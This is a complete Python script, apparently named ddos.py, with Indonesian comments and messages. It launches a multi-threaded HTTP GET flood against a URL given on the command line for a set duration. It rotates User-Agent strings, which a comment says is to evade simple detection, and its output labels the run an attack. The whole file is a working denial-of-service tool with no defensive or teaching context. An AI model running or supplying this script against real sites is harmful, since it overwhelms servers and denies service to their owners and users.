import requests
import threading
import time
import sys
from colorama import Fore, Style, init

init(autoreset=True)

if len(sys.argv) != 4:
    print(f"{Fore.RED}Usage: python ddos.py <URL> <threads> <duration>")
    sys.exit(1)

url = sys.argv[1]
threads_count = int(sys.argv[2])
duration = int(sys.argv[3])

# Header acak untuk menghindari deteksi sederhana
user_agents = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
    "Mozilla/5.0 (Linux; Android 10; SM-G973F) AppleWebKit/537.36",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 14_0 like Mac OS X) AppleWebKit/605.1.15",
]

stop_event = threading.Event()

def flood():
    while not stop_event.is_set():
        try:
            headers = {"User-Agent": __import__('random').choice(user_agents)}
            requests.get(url, headers=headers, timeout=2)
            print(f"{Fore.GREEN}[+] Request sent")
        except:
            print(f"{Fore.YELLOW}[-] Error")

print(f"{Fore.CYAN}Mulai serangan ke {url} dengan {threads_count} thread selama {duration} detik.")
threads = []
for _ in range(threads_count):
    t = threading.Thread(target=flood)
    t.daemon = True
    t.start()
    threads.append(t)

# Hitung mundur
start = time.time()
while time.time() - start < duration:
    remaining = duration - int(time.time() - start)
    sys.stdout.write(f"\r{Fore.MAGENTA}Waktu tersisa: {remaining} detik")
    sys.stdout.flush()
    time.sleep(1)

stop_event.set()
for t in threads:
    t.join()
print(f"\n{Fore.RED}Serangan selesai.")
